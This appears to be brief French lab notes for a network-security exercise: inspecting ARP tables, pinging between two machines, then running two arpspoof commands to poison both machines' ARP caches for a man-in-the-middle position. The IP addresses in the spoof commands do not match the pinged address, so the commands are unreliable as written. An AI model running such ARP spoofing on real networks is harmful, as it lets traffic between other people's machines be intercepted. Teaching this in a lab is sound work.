Vérifier la table ARP des 2 machines
> arp

De base cela ne retourne rien car les tables ARP sont vide

Tentez de ping la machine 2 depuis la machine 1
> ping 172.20.0.12 


Vérifier à nouveau la table ARP des 2 machines
> arp

// Arp spoofing sur les 2 Machines cibles
arpspoof -i eth0 -t 172.17.20.11 172.17.0.12
arpspoof -i eth0 -t 172.17.20.12 172.17.0.11
